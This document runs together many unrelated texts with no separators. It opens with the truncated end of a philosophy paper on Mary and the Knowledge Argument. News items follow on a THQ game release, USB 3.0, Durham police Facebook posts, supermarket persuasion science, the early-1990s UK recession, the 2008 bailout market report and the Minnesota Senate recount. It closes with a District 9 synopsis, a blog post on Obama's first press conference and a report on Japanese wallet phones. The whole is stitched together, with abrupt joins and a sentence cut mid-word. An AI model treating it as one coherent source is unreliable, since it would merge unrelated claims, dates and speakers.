They would also know about the Knowledge Argument and would teach her about this also , as far as this was possible in a black and white room , showing her the difference in physical correlates in herself when seeing �red� in black and white and in others who are seeing red in the real world .
Mary would still acquire colour experiences and learn something new on leaving the room , but she would already know that this new knowledge was not a threat to physicalism if the perspective on the qualia - physical relationship proposed in the present paper is correct .
The question of whether or not Mary�s new knowledge refuted physicalism would not arise , so arguments leading to the perspective itself would not arise and neither would the perspective .
The concern is that the argument for the perspective depends on the Knowledge Argument , but if the perspective is true , there is no Knowledge Argument and no argument in favour of the perspective .
In fact , there are two reasons why this concern is not justified :
� First , even in the scenario just described , Mary will still learn something new on leaving the room that is a potential threat to physicalism .
It will still be true that this knowledge will refute physicalism unless it is knowledge that cannot be expressed verbally without loss .
And it will also still be true that it will refute physicalism unless it is valid knowledge of the physical that is itself physical .
Mary may know how to deal with the challenge to physicalism her new knowledge represents , but the challenge itself still exists .
It is still true that if Mary learns something new then physicalism is refuted unless the perspective on the qualia - physical relationship presented in this paper ( and , in this scenario , known to Mary in her room ) is true .
It is simply that if Mary already knows about the perspective that allows physicalism to stand then the process of stating the Knowledge Argument becomes more convoluted .
In particular , it becomes necessary to spell out the perspective from the start , making the whole process of developing the argument in its favour somewhat less straightforward .
� Second , although the qualia - physical relationship presented here has been developed initially on the basis of an examination of the Knowledge Argument , the case for the perspective itself does not depend on the Knowledge Argument .
The value of the Knowledge Argument is that describes readily imaginable circumstances tha
Destroy all Humans to see European PS3 release Title to be Xbox 360 exclusive in US only , while the EU release is pushed to next year

THQ has clarified that while the PlayStation 3 version of its upcoming title , Destroy All Humans !
Path of Furon , is not going to see a release in the US it will be released in Europe .
Yesterday it was reported that the publisher was canning the PS3 version of the title due to " development issues " , however it has now been revealed that the title will only be an Xbox 360 exclusive in the US and have its release on both platforms in Europe on the delayed date of February 13 .
" Destroy all Humans : Path of the Furon will be released on both the Xbox 360 and PlayStation 3 formats on February 13th 2009 across Europe , " a company representative told Eurogamer .
" Due to the game being shipped earlier in North America on 2nd December a decision was made to proceed exclusively with the Xbox 360 format in that market . "
USB 3.0 will be unveiled next Monday , and so far the new specs for the protocol look incredible , promising 25 GB transfers in a mere 70 seconds .
To put that in perspective , the same transfer would take 13.9 minutes with the current USB 2.0 protocol and 9.3 hours on USB 1.0 .
Looks like the future of wired syncs and backups is bright and blazing .

— Durham police commanders said they would release the findings Friday of an internal investigation into whether officers posted offensive comments on the Internet after the presidential election .
An unknown number of officers were accused of posting derogatory comments on their personal Facebook pages shortly after President - elect Barack Obama ’s win Nov. 4 .
Police leaders were expected to release a copy of the Facebook pages so the public can decide if there were inappropriate postings .
The Durham chapter of the National Association for the Advancement of Colored People has demanded more information , charging that public trust in the department has been hurt .
“ Everybody is trying to say there is an inference , but we do n’t know what that inference is , ” Durham NAACP president Fred Foster said .
Police have not elaborated on what words might have been used in the postings or stated the race of the officers .
Foster said there is distrust among some people who feel the officers might not be able to objectively serve the community .
“ There is an area of trust that has been violated or at least been damaged , ” he said .
Foster said that an officer or officers posted inappropriate comments , he wants the police department take action against them .
A statement released by the police department reads : " Ethnic , racist or sexist comments are not tolerated in the Durham Police Department .
The Department has a code of conduct and regulations that put officers on notice that high standards of conduct are required and expected both on and off duty . "
The statement went on to say that if the allegations are sustained , the department would take appropriate action .
IT MAY have occurred to you , during the course of a dismal trawl round a supermarket indistinguishable from every other supermarket you have ever been into , to wonder why they are all the same .
The answer is more sinister than depressing .
It is not because the companies that operate them lack imagination .
It is because they are all versed in the science of persuading people to buy things — a science that , thanks to technological advances , is beginning to unlock the innermost secrets of the consumer 's mind .
In the Sainsbury 's in Hatch Warren , Basingstoke , south - west of London , it takes a while for the mind to get into a shopping mode .
This is why the area immediately inside the entrance of a supermarket is known as the “ decompression zone ” .
People need to slow down and take stock of the surroundings , even if they are regulars .
In sales terms this area is a bit of a loss , so it tends to be used more for promotion .
Even the multi-packs of beer piled up here are designed more to hint at bargains within than to be lugged round the aisles .
Wal - Mart , the world 's biggest retailer , famously employs “ greeters ” at the entrance to its stores .
Whether or not they boost sales , a friendly welcome is said to cut shoplifting .
It is harder to steal from nice people .
Immediately to the left in Sainsbury 's is another familiar sight : a “ chill zone ” for browsing magazines , books and DVDs , tempting impromptu purchases and slowing customers down .
But those on a serious mission will keep walking ahead — and the first thing they come to is the fresh fruit and vegetables section .
For shoppers , this makes no sense .
Fruit and vegetables can be easily damaged , so they should be bought at the end , not the beginning , of a shopping trip .
But psychology is at work here : selecting good wholesome fresh food is an uplifting way to start shopping , and it makes people feel less guilty about reaching for the stodgy stuff later on .
Shoppers already know that everyday items , like milk , are invariably placed towards the back of a store to provide more opportunity to tempt customers .
This is why pharmacies are generally at the rear , even in “ convenience ” stores .
But supermarkets know shoppers know this , so they use other tricks , like placing popular items halfway along a section so that people have to walk all along the aisle looking for them .
The idea is to boost “ dwell time ” : the length of time people spend in a store .
Traditionally retailers measure “ footfall ” , as the number of people entering a store is known , but those numbers say nothing about where people go and how long they spend there .
But nowadays , a ubiquitous piece of technology can fill the gap : the mobile phone .
Path Intelligence , a British company working with the Massachusetts Institute of Technology , tracked people 's phones at Gunwharf Quays , a large retail and leisure centre in Portsmouth — not by monitoring calls , but by plotting the positions of handsets as they transmit automatically to cellular networks .
It found that when dwell time rose 1 % sales rose 1.3 % .
Having walked to the end of the fruit and vegetable aisle , Basingstoke 's hard - core shoppers arrive at counters of prepared food , the fishmonger , the butcher and the deli .
Then there is the in - store bakery , which can be smelt before it is seen .
Even small supermarkets now use in - store bakeries .
Mostly these bake pre-prepared items and frozen dough , and they have boomed even though central bakeries that deliver to a number of stores are much more efficient .
They do it for the smell of freshly baked bread , which makes people hungry and thus encourages people to buy not just bread but also other food , including frozen stuff .
Most of the information that shoppers are bombarded with is visual : labels , price stickers and advertising .
But the wafting bread aroma shows smell can usefully be stimulated too , says Simon Harrop , chief executive of BRAND sense agency , a British specialist in multi-sensory marketing .
In the aisle by the laundry section he suggests introducing the smell of freshly laundered sheets .
Even the sound of sheets being folded could be reproduced here and contained within the area using the latest audio technology .
The Aroma Company , which Mr Harrop founded , has put the smell of coconut into the shops of Thompson , a British travel agent .
Some suntan oils smell of coconut , so the scent is supposed to remind people of past holidays .
The company even infuses the fresh smell of citrus into a range of clothing made by Odeur , a Swedish company .
It can waft for up to 13 washes .
Such techniques are increasingly popular because of a deepening understanding about how shoppers make choices .
People tell market researchers and “ focus groups ” that they make rational decisions about what to buy , considering things like price , selection or convenience .
But subconscious forces , involving emotion and memories , are clearly also at work .
Scientists used to assume that emotion and rationality were opposed to each other , but Antonio Damasio , now professor of neuroscience at the University of Southern California , has found that people who lose the ability to perceive or experience emotions as the result of a brain injury find it hard or impossible to make any decisions at all .
They can't shop .
Oh , that 's what I want
Researchers are now exploring these mechanisms by observing the brain at work .
One of the most promising techniques is functional magnetic resonance imaging ( fMRI ) , which uses a large scanner to detect changes in the blood flow in parts of the brain that correspond to increases or decreases in mental activity .
People lying inside the scanners are shown different products or brands and then asked questions about them .
What they say is compared with what they are thinking by looking at cognitive or emotional activity .
The idea is that if , say , a part of the brain that is associated with pleasure lights up , then the product could be a winner .
This is immensely valuable information because eight out of ten new consumer products usually fail , despite test marketing on people who say they would buy the item — but whose subconscious may have been thinking something different .
“ We are just at the frontier of the subconscious , ” says Eric Spangenberg , dean of the College of Business at Washington State University and an expert on the subtleties of marketing .
“ We know it 's there , we know there are responses and we know it is significant . ”
But companies commissioning such studies keep the results secret for commercial reasons .
This makes Dr Spangenberg sure of one thing : “ What I think I know , they probably know way more . ”
We are just at the frontier of the subconscious
Retailers and producers talk a lot about the “ moment of truth ” .
This is not a philosophical notion , but the point when people standing in the aisle decide what to buy and reach to get it .
The Basingstoke store illustrates some of the ways used to get shoppers ' hands to wobble in the direction of a particular product .
At the instant coffee selection , for example , branded products from the big producers are arranged at eye - level while cheaper ones are lower down , along with the supermarket 's own - label products .
Often head offices will send out elaborate plans of where everything has to be placed ; Albertsons , a big American supermarket chain , calls these a “ plan - a - gram ” .
Spot - checks are carried out to make sure instructions are followed to the letter .
The reason for this strictness is that big retailers demand “ slotting fees ” to put suppliers ' goods on their shelves , and these vary according to which positions are considered to be prime space .
But shelf - positioning is fiercely fought over , not just by those trying to sell goods , but also by those arguing over how best to manipulate shoppers .
Never mind all the academic papers written on how best to stack shelves , retailers have their own views .
While many stores reckon eye - level is the top spot , some think a little higher is better .
Others charge more for goods placed on “ end caps ” — displays at the end of the aisles which they reckon to have the greatest visibility ( although some experts say it all depends on the direction in which people gyrate around a store — and opinion on that is also divided ) .
To be on the right - hand - side of an eye - level selection is often considered the very best place , because most people are right - handed and most people 's eyes drift rightwards .
Some supermarkets reserve that for their own - label “ premium ” goods .
And supermarkets may categorise things in different ways , so chapatis may not be with breads , but with ready - meals of the Indian variety .
So , even though some suppliers could be paying around $ 50,000 per store a year for a few feet of shelf space , many customers still can't find what they are looking for .
Technology is making the process of monitoring shopper behaviour easier — which is why the security cameras in a store may be doing a lot more than simply watching out for theft .
Rajeev Sharma , of Pennsylvania State University , founded a company called VideoMining to automate the process .
It uses image - recognition software to scan the pictures from security cameras of shoppers while they are making their selections .
It is capable of looking at the actions of hundreds of thousands of people .
It can measure how many went straight to one brand , the number that dithered and those that compared several , at the same time as sorting shoppers by age , gender and ethnicity .
VideoMining analysed people in convenience stores buying beer .
Typically it would take them two minutes , with the majority going straight to one brand .
“ This shows their mind was already made up ; they were on autopilot , ” says Dr Sharma .
So brewers should spend their marketing money outside , not inside , the store .
The analysis can also help establish the return on investment to a new advertising campaign by showing what proportion of beer - buyers can be persuaded to consider rival brands .
Another study in a supermarket some 12 % of people spent 90 seconds looking at juices , studying the labels but not selecting any .
In supermarket decision - making time , that is forever .
This implies that shoppers are very interested in juices as a healthy alternative to carbonated drinks , but are not sure which to buy .
So there is a lot of scope for persuasion .
Reducing the selection on offer might help too .
Cassie Mogilner of Stanford University and her colleagues found in a study that consumers like unfamiliar products to be categorised — even if the categories are meaningless .
In a study of different coffees they found people were more satisfied with their choice if it came from a categorised selection , although it did not matter if the categories were marked simply A , B and C , or “ mild ” , “ dark roast ” and “ nutty ” .
Despite all the new technology , simply talking to consumers remains one of the most effective ways to improve the “ customer experience ” .
Scott Bearse , a retail expert with Deloitte Consulting in Boston , Massachusetts , has led projects observing and quizzing tens of thousands of customers about how they feel about shopping .
It began when a client complained that he had mountains of data on the one in four people that entered his store and bought something , but knew hardly anything about the vast majority who left without making a purchase .
The “ customer conversion ” rate varies between types of store : it could be around 20 % in some department stores but reach almost 100 % in a grocery .
And within the same store the conversion rate will vary in different sections .
People say they leave shops empty - handed more often because they are “ unable to decide ” than because prices are too high , says Mr Bearse .
Working out what turns customers off is not difficult , yet stores still struggle with these issues : goods out of stock , long queues at the checkouts and poor levels of service .
Getting customers to try something is one of the best ways of getting them to buy , adds Mr Bearse .
Deloitte found that customers using fitting rooms convert at a rate of 85 % compared with 58 % for those that do not do so .
Often a customer struggling to decide which of two items is best ends up not buying either .
A third “ decoy ” item , which is not quite as good as the other two , can make the choice easier and more pleasurable , according to a new study using fMRI carried out by Akshay Rao , a professor of marketing at the University of Minnesota .
Happier customers are more likely to buy .
Dr Rao believes the deliberate use of irrelevant alternatives should work in selling all sorts of goods and services , from cable TV to holidays .
The notion of shoppers wearing brain - scanning hats would be ridiculous
A lack of price tags is another turn - off , although getting that right will become crucial with the increasing use of Radio Frequency Identification ( RFID ) tags .
These contain far more information than bar codes and can be scanned remotely .
People have been predicting for years that they would shortly become ubiquitous ; but , with costs continuing to fall , they eventually will .
Tills will then become redundant , because everything shoppers put in their trolleys will be automatically detected and charged to their credit cards .
The basic mechanisms to do this are already in place .
A store or loyalty card can be fitted with an RFID tag to identify customers on arrival .
A device on the trolley could monitor everything placed in it , check with past spending patterns and nudge customers : “ You have just passed the Oriels , which you usually buy here . ”
Mind over matter
Technology will also begin to identify customers ' emotions .
Dr Sharma 's software has the potential to analyse expressions , like smiles and grimaces , which are hard to fake .
And although fMRI scanners presently need a crane to move , something that provides a similar result might one day be worn on your head .
Researchers believe it is possible to correlate brain patterns with changes in electrical activity in the brain , which can be measured with electroencephalography ( EEG ) using electrodes placed on the scalp .
Small EEG machines are already available , especially for computer gamers , which fit on the head .
The notion of shoppers wearing brain - scanning hats would be ridiculous if it were not so alarming .
Privacy groups are already concerned about the rise of electronic surveillance that records what people do , let alone what they might be thinking .
The San Francisco - based Electronic Frontier Foundation is concerned that because RFID tags can be read at a distance by anyone with the necessary equipment they could create “ privacy pollution ” ; being used to discover what is in not only someone 's shopping trolley , but also their cupboards .
To some degree shoppers would have to “ buy in ” to the process : a bit like having an account with an online retailer which comes with the explicit knowledge that your past purchases and browsing history will be monitored and used to pitch purchase suggestions .
And if that makes shopping easier — especially if sweetened with discounts — then consumers might sign up to it .
When Dr Sharma asks shoppers what they think about his video - monitoring he says most people do not mind .
But what if psychological selling is done stealthily ?
That way lies grave perils .
It is the anger not of privacy groups that retailers should fear , but of customers at being manipulated from behind the scenes .
There have been backlashes before : “ The Hidden Persuaders ” by Vance Packard , an American journalist , caused a sensation when it was first published in 1957 by revealing physiological techniques used by advertisers , including subliminal messages .
It is what got Dr Spangenberg interested in the subject .
He thinks shopping science has limits .
“ I do n't think you are going to be able to make someone buy a car or a computer that they do n't need , ” he says .
“ But you might persuade them to choose one model instead of another .
And importantly , they would n't know it . ”
But if they did realise psychological methods were being used to influence their choice , “ the counteraction can be so huge it can put someone off buying anything at all , ” he adds .
Which is probably why at the end of this shopping trip there is not much in the trolley .
At least the temptations at the checkout are easy to avoid : a few celebrity magazines and bags of sweets at the eye - level of children .
But that will change too .
Barry Salzman , the chief executive of YCD Multimedia in New York , has big plans for the area around a cash till .
He is using digital video screens displaying ads that relate to what someone is buying and which can also be linked with facial - recognition software to refine the displays according to the customer 's age or sex .
His system is already being used in Aroma Espresso Bars in America to present , say , an advert for a chocolate croissant to someone buying only a cappuccino .
But the checkout in this Sainsbury 's comes to a halt because the teenager at the till is not old enough to sell alcohol and can't attract the attention of a supervisor for permission to ring up a multi-pack of beer , which is therefore left behind on the counter .
The science of shopping is a marvellously sophisticated business ; the practice is still a little more primitive .

The UK 's economic output has fallen for the first time since 1992 , when the country was emerging from a recession that had lasted nearly two years .
So what was Britain like at the start of the last downturn and what 's happened to people who suffered then ?
On 5 December 1990 , the UK was enduring a cold snap and on the way was a fierce snowstorm that brought much of the country to a standstill .
Those hoping for a thaw could draw no respite from the music charts , where Vanilla Ice was just beginning his three weeks at the top , with Ice , Ice , Baby .
Please turn on JavaScript .
Media requires JavaScript to play .
Such signs were ominous , for an economic chill had been descending for months and this led Chancellor Norman Lamont to stand up on that day and tell MPs that the UK was entering a recession .
Eighteen years later Prime Minister Gordon Brown has warned of the same possibility and on Friday , GDP figures showed the economy shrank for the first time since the end of that downturn in 1992 .
Mr Lamont 's speech hardly came as a shock .
The country 's GDP had just recorded its sharpest drop in 10 years and retail sales in October had fallen 1.1 % , a much bigger drop than expected .
Inflation was in double figures and interest rates were recently as high as 15 % .
WHAT ELSE HAPPENED IN 1990 ?
Films : Edward Scissorhands , Pretty Woman , Home Alone Sport : Gazza cried , Sir Alex Ferguson was seven minutes from the sack as Man Utd manager Music : Sinead O'Connor , Happy Mondays , Primal Scream Television : Twin Peaks , Baywatch , The Simpsons
In the news : Geoffrey Howe resigned , Thatcher ousted , 100 British hostages freed by Iraq
The political world was equally stormy .
One of Britain 's longest serving prime ministers , Margaret Thatcher , had only one week earlier bade a tearful farewell at Downing Street , handing the keys over to John Major .
After the boom of the 1980s , Britain 's hangover was starting to kick in , with bankruptcies and repossessions mounting , and dole queues lengthening .
Even owners of Michelin - starred restaurants were n't spared .
With 30 years of experience in the business , Patrick McDonald , 46 , now says 1991 was financially his toughest year .
He had opened his bistro in the spring of 1990 but 18 months later it went under , despite being part of one of the top restaurants in the country at the time : The Epicurean in Stow - on - the - Wold .
What 's the real impact of the economic slowdown ?
BBC
News is taking the temperature across the UK in a special day of coverage
Special report :
The downturn " The recession bit harder and harder and harder and one of the high street banks we were mortgaged with decided that it was vulnerable and they called in the mortgage even though we had been paying it .
" It was not only my business but a home for my wife and children .
It put us under immense pressure because we did n't have a home to live in . "
He put the property into voluntary liquidation but before literally throwing the keys at the bank representatives , he stripped out all the fittings - radiators , lights , water boiler - and sold them back to the business that moved in .
That enabled him to pay back some of the creditors .
Mr McDonald bounced back from his bistro going under
But he bounced back .
The family rented a home , he later set up a consultancy advising chefs and his comeback was sealed when he became one of the first television chefs to host a reality show - Channel 4's If You Ca n't Stand The Heat .
" I 've been knocked down a few times but come through .
I 've employed thousands of people over 30 years and created a lot of jobs and if I was to sit back and not do anything I would be nothing . "
A year after the bistro closed , another small business was folding a couple of hundred miles east , in Norwich .
Severe struggle Tom MacKeown set up Rags to Riches in 1985 , designing and selling upmarket women 's wear , but a few years later its troubles began , when the pound suddenly climbed nearly 15 % in value against other currencies , making its exports very expensive .
Coupled with two wet summers washing out the county shows at which he sold , it was a fatal blow .
We struggled severely for two years
Tom MacKeown
" It was one of the first times when the pound climbed against the other currencies , so our clothes became unaffordable .
" And because we had borrowed fairly extensively to expand , without the turnover there was no profit margin to pay the bank and we closed the business in 1992 . "
The family kept their house but struggled severely for a few years as they paid back creditors , giving up their car and holidays abroad .
Now Mr MacKeown runs a building firm called Designer Stubble that uses natural materials like straw and clay , and he says that as long as there is enough money to feed his four children , then he 's happy .
The problems with the value of sterling , that contributed to the downfall of his business , were at the heart of the economic problems of the times .
With interest rates rising and house prices tumbling , the obvious solution would have been to lower interest rates .
But the government 's economic policy was built around shadowing the strong German mark - as part of British membership of the Exchange Rate Mechanism or ERM .
Although the UK was technically out of recession by the time it left ERM on so - called Black Wednesday in September 1992 , its effect continued to be painfully felt , especially in areas that remained in negative equity .
Sarah Stewart , now 48 , believes it cost her her marriage .
Three years after buying her flat in Newcastle for £ 18,000 in 1991 , she moved south to start a new job and tried to sell it but it was now worth less than she paid for it .
An offer came in for £ 15,000 but the lending bank - as many did at the time - said that was too low .
Meanwhile it was regularly getting broken into , so repair costs were mounting .
" I handed back the keys because I could n't cope with it anymore , " says Ms Stewart , which is not her real name at her request .
Brown followed in Lamont 's footsteps " I was so close to having a nervous breakdown and I just knew I had to get shot of it .
I thought that was it , until five years later , when I had my first baby , a letter arrived on the doormat from the bank , saying they sold it for £ 1,300 and so I owed them £ 17,000 . "
After a two - year battle , the bank finally settled at a much lower amount but by then the fight had taken its toll on her relationship and she split up with her husband .
The financial repercussions also remain .
" I 've never recovered my earning potential .
I lost two years of my life fighting this claim , then years and years of never being able to buy another house .
" It really affected me long - term .
My husband left me , leaving me bringing up two kids on my own . "
As a new recession looms , scars from the last one suggest it will be a long road to recovery .
Below is a selection of your comments .
In the early 90s I 'd recently bought a house on an interest only mortgage with little equity following a divorce .
The value of the house dropped into negative equity and interest rates hit 15 % .
I was unable to sell and ended up servicing the mortgage using an overdraft .
It took me over 5 years to clear the overdraft .
I still live in the same house but now the mortgage is only about 40 % of the property value , even allowing for the depressed housing market .
If I can stay employed during the current recession I 'll be happy ( no certainty there as I 'm an IT worker for an investment bank ) .
Rob Lovett , Swindon , UK I was 17 years old at the time .
I was an A - level student living at home ; I had no job , no mortgage , no debts .
" The recession " was just some boring rubbish that they talked about on the news .
I was more interested in girls and the Happy Mondays .
This time , though - as an employed homeowner juggling rising fuel bills with credit card debts - I am realising what all the concern was about .
Dave Damon , Huddersfield , UK Anyone under about 38 will probably not have experience of what the recession of the early 90s was like .
I was made redundant twice in the 90s and with a young family with just one income it was quite unpleasant .
Negative equity will be a new experience for many who have over stretched themselves in a housing market that just had to nowhere else to go but down ( 50 % I would guess ) .
Perhaps this is the reality check we all need ?
Nick , Gosport I remember the recession very well , me and my boyfriend had just bought our first house and moved in after renovating for over a year in December 1990 by January 1991 my boyfriend had been made redundant , as he had been with the firm for less than 2 years he did n't receive any redundancy pay , he was out of work for 10 weeks , so I suppose we were lucky , but during those 10 weeks it was so very difficult , as we were n't married we did n't get any financial help whatsoever , our house had devalued so we could n't sell up , but in 2000 we sold that house and made a huge profit , so there is hope when the recession is over .
Elaine , Coventry , England Fortunately we have a more credible monetary policy than in the 90's ; a more experienced prime minister and better social agenda that looks out for people .
It 's not avoiding the knocks that is a measure of leadership , it 's how you deal with them .
Ben , Bristol I do n't think the recession of the early 80s ever really ended for some : I left school in 1985 to almost zero employment for fellow pupils , went to college and qualified just in time for the nineties one , and by then employers were wise to how desperate people were for a gainful job .
All around me friends were being bullied into minimum - wage jobs due to fear of being on benefits .
I was dumped by such an employer at the end of last year ( thankfully ) .
Scraping around for bits of work has been a necessity to a large part of the population for years - so I might ask what recession ?
Grrr Jordan , Wirral I worked as an Administrator at a building society that was known for risky mortgages .
When the recession hit , it got taken over and most of us were made redundant .
After 3 months of not being able to get a decent job I became a cocktail bartender then went to do some further studies .
I 'm now a university lecturer .
Sometimes these things work out for the better .
Bob , London I was too young to know much about the last recession but my dad told me the other day that business got so bad they were weeks away from having to sell our family home .
I was so shocked that they had been through that hell and I 'd been so blissfully unaware .
I feel desperately for all the men today who are in the same position as my father was then , with kids to support and a home to look after .
SF , Reading My girlfriend ( now my wife ) and I bought a flat in Northolt in 1988 for £ 65,000 .
A few years later it was worth £ 35,000 - £ 40,000 , and we had a 100 % mortgage .
We could n't sell the flat because of negative equity , so we rented it out and went abroad until 2001 , which was the best thing we ever did .

What baffles me is how quickly folks seem to forget , and how those in politics and finance have the gall to feign surprise .
I was only 18 at the time of the last recession , and I 'm certainly no expert in economics , but it was so blatantly obvious that this was going to happen again , I 've been warning friends for the past three or four years to downsize , or even sell up and rent for a year or two , until prices drop .
The banks ' iniquitous policy of offering huge mortgages ( on the basis that price houses will rise - a self - fulfilling prophecy , as it is precisely this easy availability of money that pushes prices up ) is largely to blame .
The markets had clearly got unsustainably high , and the bubble was just waiting to burst .
I expect people will blame the government for the recession , and I can't say I entirely disagree , but then again , last time round , as the article points out , the Tories had been in power for over a decade .
They 're all as bad as each other .
End of rant .

NEW YORK ( CNNMoney.com ) --
Stocks slipped Wednesday morning as investors took a step back from the previous session 's rally and geared up for the Senate vote later on a tweaked version of the $ 700 billion bailout package .
The Dow Jones industrial average ( INDU ) , the Standard & Poor 's 500 ( SPX ) index and the Nasdaq composite ( COMP ) all dropped in the early going .
This follows a tremendous Tuesday on Wall Street , which saw the Dow Jones industrial average jump 485 points , or 4.7 % , on hopes for a new bailout package .
On Monday , the Dow plunged 777 points , its worst point drop ever , after the House rejected the bailout bill .
The Senate version of the bill includes new provisions , such as raising the Federal Deposit Insurance Corp. cap protecting deposits to $ 250,000 from $ 100,000 .
The provisions will be added to an existing revenue bill that the House also rejected Monday , according to Democratic leadership aides .
" Everybody 's waiting around for the vote from the Senate , " said Peter Cardillo , an analyst with Avalon Partners .
" It looks like we 're going to get a bailout plan .
It would be devastating at the point if we did n't . "
Economy :
As another sign of the economic crisis , the Mortgage Bankers Association 's report showed a 23 % plunge in mortgage applications in the week ended Sept. 26 .
Automatic Data Processing released its monthly employment report , showing a decline of 8,000 private sector jobs in September , from the prior month .
In August , the economy lost 37,000 jobs , ADP said .
At 10 a.m. ET , the Commerce Department will release its August measurement of construction spending .
Economists surveyed by Briefing.com project a decline of 0.4 % , compared to a steeper decline of 0.6 % the prior month .
Also at 10 a.m. , the Institute for Supply Management - a purchasing managers ' group - will release its September index of manufacturing activity .
Economists surveyed by Briefing.com project a reading of 50.1 , just above the 50 mark that denotes economic expansion and the 49.9 reading in August .
At 10:35 a.m. ET , the Energy Information Administration releases weekly inventory data .
Analysts surveyed by Platts expect U.S. crude stocks to range between a 1.5 million barrel increase and a 1.5 million barrel decrease in the week ended Sept. 26 .
Markets :
The Nikkei closed higher , while European markets were mostly higher .
The dollar edged up versus the euro , the British pound and the yen .
Oil prices dipped , falling $ 1.83 to $ 98.81 a barrel .
The intense scrutiny of " voter intent " resumed today by the five - member board charged with directing Minnesota 's recount in the U.S. Senate race between incumbent Republican Norm Coleman and Democratic rival Al Franken , and the day 's rulings turned the challenger 's slight deficit into a triple - digit lead .
Also today , the State Canvassing Board sidestepped the Coleman team 's proposal to prevent as many as 150 ballots from being counted twice .
Talking about instances when a ballot could n't be run through a voting machine , requiring a duplicate to be made , the Coleman camp said that such ballots should be counted only if an original could be matched with its copy .
However , board members ruled that the duplicates should not be addressed by the board but in " another forum , " said Board Chairman Mark Ritchie .
But it will consider the ballots if there are questions about the intent of the voters who cast them , the board said .
Soon after , Coleman officials requested that the state Supreme Court prevent the Canvassing Board from including these votes in its recount totals .
In response to the Coleman request , Franken spokesman Andy Barr said : " This is just the latest desperate act by a campaign panicked because it has suddenly realized that it is going to lose the election . "
On Thursday , the board reviewed Coleman 's challenges of hundreds of Election Day ballots , and the day 's work saw the unofficial margin between the candidates dwindle to within a handful of votes .
Then , as the board took up and rejected more Coleman challenges today , Franken pulled ahead in the opening minutes and steadily built his advantage to about 250 before the panel recessed until Monday .
In 1982 , a massive star ship bearing a bedraggled alien population , nicknamed " The Prawns , " appeared over Johannesburg , South Africa .
Twenty - eight years later , the initial welcome by the human population has faded .
The refugee camp where the aliens were located has deteriorated into a militarized ghetto called District 9 , where they are confined and exploited in squalor .
In 2010 , the munitions corporation , Multi-National United , is contracted to forcibly evict the population with operative Wikus van der Merwe in charge .
In this operation , Wikus is exposed to a strange alien chemical and must rely on the help of his only two new ' Prawn ' friends .

THE PRESIDENT -ELECT FIELDS A FEW QUESTIONS ….
A few days before the election , a reporter pressed Barack Obama on when the media could expect another press conference .
Obama , half - joking , point to the day after the election .
As it turns out , he waited until three days after the election , but held a press conference in Chicago this afternoon .
I took a bunch of notes , but soon after , noticed that Joe Klein ’s write - up said most of what I ’d planned to write anyway .
Well , if the presidential campaign did n’t convince you that Barack Obama is one disciplined fellow , his first public appearance as President - elect certainly should have .
The press conference was notable for several things : * he did not stray from or change a single position that he took during the course of the campaign .
He emphasized his previous stated desire for the passage of a second stimulus package .
He was very matter of fact and not very emotional when discussing the economic crisis .
There was no “ Do n’t you worry , now … ” component to his initial statement , which was a bit disconcerting — to me , at least .
* he was not lured into any speculative answers .
He was properly cautious in response to the Ahmadinejad letter congratulating him on his victory and , by emphasizing his opposition to Iran ’s nuclear program — and its support for terrorist groups —
Obama conveyed a continuity appropriate for a President - elect . *
His answers were crisp and brief .
The most expansive was his response to the puppy question .
This presages a cool , businesslike presidency .
*
No gaffes .
Unlike Bill Clinton , who opened the door to the “ gays in the military ” question in his first press conference , Obama said nothing controversial , so far as I can tell .
*
Unlike his immediate predecessor , he seemed completely in control .
I ’d just add a couple of other random observations .
First , on the “ dog question , ” Obama talked about the dog he ’d promised his daughters .
Apparently , one of his daughters is allergic , so he talked in detail about the tongue - in - cheek weightiness of the family matter .
Referencing shelter - dogs , Obama mentioned “ mutts like me . ”
It was quite endearing .
Second , it was n’t a “ gaffe , ” but Obama stumbled just a little when noting that he ’d been in touch with all the presidents “ who are alive . ”
When reporters chuckled a little , Obama joked he did n’t want anyone to think it was a “ Nancy Reagan seance ” kind of thing .
People laughed , but I expect there will be Fox News reports and several hundred right - wing blog posts about Obama “ attacking ” Nancy Reagan at his first press conference .
And finally , I ’d just add that it was an unusually pleasant experience watching a presidential press conference and a ) noting that the person behind the podium seemed to know what he was talking about ; and b ) not feeling the strong urge to turn it off .
TOKYO ( Reuters ) - Japanese office worker Satoshi Tada pays for shopping , wins free food and gets store discounts all by waving his cell phone .
A businessman talks on his mobile phone next to a luxury brand at Tokyo's Ginza district October 31 , 2008 .

“ I use it pretty much every day , ” the 25 - year - old said .
“ You can charge money on it right there if needed , and you do n’t have to run around trying to find an ATM .
You can even get points because it ’s linked to credit cards . ”
The world ’s top firms such as Visa Inc and Nokia are still mostly testing phone use for payments , but in Japan , more than 50 million , or about half of all cell phone users , already carry phones capable of serving as wallets .
Japan has pioneered not just the technology but also the business models that will pave the way for wallet phones to become a standard payment method in the future .
Some 700 million people worldwide are expected to own such phones by 2013 .
“ You ca n’t deny that having such applications on a phone is convenient , and that will likely be the way that mobile phones are going worldwide , ” said JPMorgan Securities analyst Hironobu Sawake in Tokyo .
“ People always carry cell phones on them , and they would find it useful to have a financial function there . ”
Success in Japan and in trials abroad have shown that the technology is ready for cell phones to replace credit cards , cash as well as serve as transportation and movie tickets and electronic keys for homes and offices .
But there are other hurdles ; from breaking the psychological barrier for consumers skeptical about using phones as credit cards , to working out new business models as the lines blur between banks , financial institutions and cell phone companies .
Japan is leading the way in this regard .
KDDI , for example , is a Japanese telecom operator that has recently set up a bank along with Mitsubishi UFJ Financial Group .
NTT DoCoMo , Japan ’s biggest wireless carrier , offers credit cards and lending services as part of a tie up with Sumitomo Mitsui Financial Group , Japan ’s third - largest bank .
Outside Japan , telecom industry and financial players are still in the midst of working out how the wallet phone payment business would operate , who would get a cut and when .
“ Traditional financial industry met telcos by going mobile .
Now telecom operators want to play a part in that chain .
These talks are well under way , ” said Gerhard Romen , Director for Strategic Alliances & Partnering at Nokia .
The world ’s biggest payment card company , Mastercard , said last month it was in talks over commercial launches of phone wallets with several banks , and during the next two years it expects to see substantial activity from retail - focused banks .
“ Now banks say : I have no doubt in the technology .
We need to solve the business model between mobile and payments industries .
It ’s not a trivial task , ” said James Anderson , a Vice President at Mastercard ’s mobile business .
“ There is a very strong consumer pull for this service , ” Anderson added .
COUPONS
Tada , the Tokyo office worker , rarely pulls out his leather wallet these days as his cell phone does the job instead .
“ For shopping , I use it everywhere I can ... and I also use coupons such as Gourmet Navigator Touch wherever possible , ” Tada said , citing services at some restaurants that offer coupons and free gifts when customers wave their phones at reader terminals .
NTT DoCoMo began the so - called “ wallet phone ” service in 2004 and rivals KDDI Corp and Softbank Corp have followed suit .
